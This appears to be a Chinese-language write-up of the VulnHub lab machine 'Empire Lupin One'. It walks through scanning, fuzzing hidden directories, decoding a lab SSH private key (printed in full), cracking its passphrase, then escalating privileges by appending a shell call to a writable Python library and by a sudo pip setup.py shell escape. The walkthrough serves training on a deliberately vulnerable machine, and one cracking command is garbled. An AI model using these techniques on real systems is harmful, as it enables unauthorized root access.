# vulnhub系列——01 - Empire Lupin One

# 一、信息收集

1. 先使用arp-scan扫描，发现主机

   ``` shell
   sudo arp-scan -l
   ```

   ![1.png](img/vulnhub/01EmpireLupinOne/Image1.png)

2. 发现主机后进行端口扫描

   ``` shell
   nmap -Pn -sC -sV 192.168.51.106
   ```

   ![2.png](img/vulnhub/01EmpireLupinOne/Image2.png)

3. 发现开放80端口，访问web

   ![3.png](img/vulnhub/01EmpireLupinOne/Image3.png)

4. 只有一张图片，先下载下来，然后扫描web目录

   ``` shell
   dirsearch -u http://192.168.51.106
   ```

   ![4.png](img/vulnhub/01EmpireLupinOne/Image4.png)

5. 有robots.txt文件，访问一下

   ![5.png](img/vulnhub/01EmpireLupinOne/Image5.png)

6. 发现有/~myfiles目录，访问该目录

   ![5.png](img/vulnhub/01EmpireLupinOne/Image6.png)

7. 404，不知道是否有隐藏目录，fuzz模糊测试一下，工具地址https://github.com/xmendez/wfuzz.git

   ``` shell
   wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt --hc 403,404 http://192.168.51.106/\~FUZZ
   ```

   ![7.png](img/vulnhub/01EmpireLupinOne/Image7.png)

8. 发现一个secret，访问一下

   ![8.png](img/vulnhub/01EmpireLupinOne/Image8.png)

   ![8-2.png](img/vulnhub/01EmpireLupinOne/Image8-2.png)

9. 在~secret目录下继续fuzz

   ``` shell
   wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 403,404 http://192.168.51.106/~secret/.FUZZ.txt
   ```

   ![9.png](img/vulnhub/01EmpireLupinOne/Image9.png)

10. 成功fuzz出一个隐藏文件mysecret，尝试访问，获得密文

    ![10.png](img/vulnhub/01EmpireLupinOne/Image10.png)

# 二、解密密文，获取shell

1. 尝试解密上述密文，解密网址http://www.metools.info/code/c74.html，解密后内容如下

   ``` shell
   ![Image11](D:\笔记\web安全学习笔记\img\vulnhub\01 - Empire Lupin One\Image11.png)-----BEGIN OPENSSH PRIVATE KEY-----
   b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jYmMAAAAGYmNyeXB0AAAAGAAAABDy33c2FpPBYANne4oz3usGAAAAEAAAAAEAAAIXAAAAB3NzaC1yc2EAAAADAQABAAACAQDBzHjzJcvk9GXiytplgT9z/mP91NqOU9QoAwop5JNxhEfm/j5KQmdj/JB7sQ1hBotONvqaAdmsK+OYL9H6NSb0jMbMc4soFrBinoLEkx894B/PqUTODesMEV/aK22UKegdwlJ9Arf+1Y48V86gkzS6xzoKn/ExVkApsdimIRvGhsv4ZMmMZEkTIoTEGz7raD7QHDEXiusWl0hkh33rQZCrFsZFT7J0wKgLrX2pmoMQC6o42OQJaNLBzTxCY6jU2BDQECoVuRPL7eJa0/nRfCaOrIzPfZ/NNYgu/Dlf1CmbXEsCVmlD71cbPqwfWKGf3hWeEr0WdQhEuTf5OyDICwUbg0dLiKz4kcskYcDzH0ZnaDsmjoYv2uLVLi19jrfnp/tVoLbKm39ImmV6Jubj6JmpHXewewKiv6z1nNE8mkHMpY5Ihe0cLdyv316bFI8O+3y5m3gPIhUUk78C5n0VUOPSQMsx56d+B9H2bFiI2lo18mTFawa0pfXdcBVXZkouX3nlZB1/Xoip71LH3kPI7U7fPsz5EyFIPWIaENsRmznbtY9ajQhbjHAjFClAhzXJi4LGZ6mjaGEil+9g4U7pjtEAqYv1+3x8F+zuiZsVdMr/66Ma4e6iwPLqmtzt3UiFGb4Ie1xaWQf7UnloKUyjLvMwBbb3gRYakBbQApoONhGoYQAAB1BkuFFctACNrlDxN180vczqmXXs+ofdFSDieiNhKCLdSqFDsSALaXkLX8DFDpFY236qQE1poC+LJsPHJYSpZOr0cGjtWpMkMcBnzD9uynCjhZ9ijaPY/vMY7mtHZNCY8SeoWAxYXToKy2cu/+pVyGQ76KYt3J0AT7wA2OR3aMMk0o1LoozuyvOrB3cXMHh75zBfgQyAeeD7LyYG/b7z6zGvVxZca/g572CXxXSXlbQOw/AR8ArhAP4SJRNkFoV2YRCe38WhQEp4R6k+34tK+kUoEaVAbwU+IchYyM8ZarSvHVpEvFUPiANSHCZ/b+pdKQtBzTk5/VH/Jk3QPcH69EJyx8/gRE/glQY6z6nC6uoG4AkIl+gOxZ0hWJJv0R1Sgrc91mBVcYwmuUPFRB5YFMHDWbYmZ0IvcZtUxRsSk2/uWDWZcW4tDskEVPftrqE36ftm9eJ/nWDsZoNxZbjo4cF44PTF0WU6U0UsJW6mDclDko6XSjCK4tk8vr4qQB8OLBQMbbCOEVOOOm9ru89e1a+FCKhEPP6LfwoBGCZMkqdOqUmastvCeUmht6a1z6nXTizommZyx+ltg9c9xfeO8tg1xasCel1BluIhUKwGDkLCeIEsD1HYDBXb+HjmHfwzRipn/tLuNPLNjGnx9LpVd7M72Fjk6lly8KUGL7z95HAtwmSgqIRlN+M5iKlB5CVafq0z59VB8vb9oMUGkCC5VQRfKlzvKnPk0Ae9QyPUzADy+gCuQ2HmSkJTxM6KxoZUpDCfvn08Txt0dn7CnTrFPGIcTOcNi2xzGu3wC7jpZvkncZN+qRB0ucd6vfJ04mcT03U5oq++uyXx8t6EKESa4LXccPGNhpfhnEcgvi6QBMBgQ1Ph0JSnUB7jjrkjqC1q8qRNuEcWHyHgtc75JwEo5ReLdV/hZBWPD8Zefm8UytFDSagEB40Ej9jbD5GoHMPBx8VJOLhQ+4/xuaairC7s9OcX4WDZeX3E0FjP9kq3QEYHzcixzXCpk5KnVmxPul7vNieQ2gqBjtR9BA3PqCXPeIH0OWXYE+LRnG35W6meqqQBw8gSPwn49YlYW3wxv1G3qxqaaoG23HT3dxKcssp+XqmSALaJIzYlpnH5Cmao4eBQ4jv7qxKRhsplAbbL2740eXtrhk3AIWiaw1h0DRXrm2GkvbvAEewx3sXEtPnMG4YVyVAFfgI37MUDrcLO93oVb4p/rHHqqPNMNwM1ns+adF7REjzFwr4/trZq0XFkrpCe5fBYH58YyfO/g8up3DMxcSSI63RqSbk60Z3iYiwB8iQgortZm0UsQbzLj9i1yiKQ6OekRQaEGxuiIUA1SvZoQO9NnTo0SVy7mHzzG17nK4lMJXqTxl08q26OzvdqevMX9b3GABVaH7fsYxoXF7eDsRSx83pjrcSd+t0+t/YYhQ/r2z30YfqwLas7ltoJotTcmPqII28JpX/nlpkEMcuXoLDzLvCZORo7AYd8JQrtg2Ays8pHGynylFMDTn13gPJTYJhLDO4H9+7dZy825mkfKnYhPnioKUFgqJK2yswQaRPLakHUyviNXqtxyqKc5qYQMmlF1M+fSjExEYfXbIcBhZ7gXYwalGX7uX8vk8zO5dh9W9SbO4LxlI8nSvezGJJWBGXZAZSiLkCVp08PeKxmKN2S1TzxqoW7VOnI3jBvKD3IpQXSsbTgz5WB07BUmUbxCXl1NYzXHPEAP95Ik8cMB8MOyFcElTD8BXJRBX2I6zHOh+4Qa4+oVk9ZluLBxeu22rVgG7l5THcjO7L4YubiXuE2P7u77obWUfeltC8wQ0jArWi26x/IUt/FP8Nq964pD7m/dPHQE8/oh4V1NTGWrDsK3AbLk/MrgROSg7Ic4BS/8IwRVuC+d2w1Pq+X+zMkblEpD49IuuIazJBHk3s6SyWUhJfD6u4C3N8zC3Jebl6ixeVM2vEJWZ2Vhcy+31qP80O/+Kk9NUWalsz+6Kt2yueBXN1LLFJNRVMvVO823rzVVOY2yXw8AVZKOqDRzgvBk1AHnS7r3lfHWEh5RyNhiEIKZ+wDSuOKenqc71GfvgmVOUypYTtoI527fiF/9rS3MQH2Z3l+qWMw5A1PU2BCkMso060OIE9P5KfF3atxbiAVii6oKfBnRhqM2s4SpWDZd8xPafktBPMgN97TzLWM6pi0NgS+fJtJPpDRL8vTGvFCHHVi4SgTB64+HTAH53uQC5qizj5t38in3LCWtPExGV3eiKbxuMxtDGwwSLT/DKcZQb50sQsJUxKkuMyfvDQC9wyhYnH0/4m9ahgaTwzQFfyf7DbTM0+sXKrlTYdMYGNZitKeqB1bsU2HpDgh3HuudIVbtXG74nZaLPTevSrZKSAOit+Qz6M2ZAuJJ5s7UElqrLliR2FAN+gBECm2RqzB3Huj8mM39RitRGtIhejpsWrDkbSzVHMhTEz4tIwHgKk01BTD34ryeel/4ORlsCiUJ66WmRUN9EoVlkeCzQJwivI=
   -----END OPENSSH PRIVATE KEY-----
   ```

2. 似乎是个rsa密钥，将解密后的内容保存到一个文件中，以id_rsa命名，尝试进行破解，经过几番尝试，最后看了下网上的教程，按照如下方法成功破解出密码

   ``` python
   python /usr/share/john/ssh2john.py id_rsa > id_rsa_crackjohn --wordlist=/usr/share/wordlists/fasttrack.txt id_rsa_crack
   ```

   ![11.png](img/vulnhub/01EmpireLupinOne/Image11.png)

3. 尝试ssh连接

   ``` shell
   ssh -i id_rsa icex64@192.168.51.106
   ```

   ![12.png](img/vulnhub/01EmpireLupinOne/Image12.png)

4. 登录成功，拿到user.txt

   ![13.png](img/vulnhub/01EmpireLupinOne/Image13.png)

# 三、提权

1. 查看内核、权限、可执行文件信息，寻找提权漏洞

   ``` shell
   id
   ls -l /bin/date
   sudo -l
   ```

   ![14.png](img/vulnhub/01EmpireLupinOne/Image14.png)

2. 发现/bin/data具有root权限，可读、写、执行，sudo -l发现一个arsene用户可免密执行heist.py，该文件在/home/arsene/下，cat查看一下内容

   ![15.png](img/vulnhub/01EmpireLupinOne/Image15.png)

3. 文件使用了webbrowser库，使用find命令查找这个库

   ``` shell
   find /usr/ -name '*webbrowser*'
   ```

   ![16.png](img/vulnhub/01EmpireLupinOne/Image16.png)

4. 该库文件位于/usr/lib/目录下，查看该库文件权限

   ``` shell
   ls -la /usr/lib/python3.9/webbrowser.py
   ```

   ![17.png](img/vulnhub/01EmpireLupinOne/Image17.png)

5. 文件具有全部root权限，写入shell脚本

   ``` shell
   echo os.system\(\"/bin/bash\'\)>> /usr/lib/python3.9/webbrowser.py
   sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
   ```

   ![18.png](img/vulnhub/01EmpireLupinOne/Image18.png)

6. 成功进入另一个用户，sudo -l查看一下

   ![19.png](img/vulnhub/01EmpireLupinOne/Image19.png)

7. 发现可以免密执行pip，且pip权限为root，那就可以使用pip进行提权，新建一个目录创建setup.py文件（不能直接使用mkdir），利用pip install以root权限运行，这样就可以获取到root权限

   ``` shell
   TF=$(mktemp -d)
   echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
   sudo pip install $TF
   ```

   ![20.png](img/vulnhub/01EmpireLupinOne/Image20.png)

